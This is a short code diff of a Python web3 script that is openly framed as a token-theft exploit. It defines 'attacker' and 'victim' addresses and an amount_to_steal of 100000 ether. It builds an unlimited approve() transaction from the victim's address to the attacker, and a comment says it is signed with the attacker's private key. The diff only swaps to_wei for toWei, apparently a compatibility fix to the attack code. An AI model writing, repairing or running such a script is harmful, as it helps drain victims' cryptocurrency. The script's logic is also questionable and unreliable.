@@ -21,7 +21,7 @@ attacker = "0x9701b5f824873560ad5670De0891D8D80F998eBa"
 victim = "0xDA5eEeF71CE9892b79b0215E771153f84930A653"
 
 # Set the amount you want to exploit
-amount_to_steal = w3.to_wei(100000, 'ether')  # Adjust decimals if needed
+amount_to_steal = w3.toWei(100000, 'ether')  # Adjust decimals if needed
 
 # Load ABI
 with open("C.json") as f:
@@ -34,7 +34,7 @@ tx1 = token.functions.approve(attacker, 2**256 - 1).build_transaction({
     "from": victim,
     "nonce": w3.eth.get_transaction_count(victim),
     "gas": 200000,
-    "gasPrice": w3.to_wei("5", "gwei")
+    "gasPrice": w3.toWei("5", "gwei")
 })
 
 # Step 2: Sign the approval transaction (using the attacker's private key)
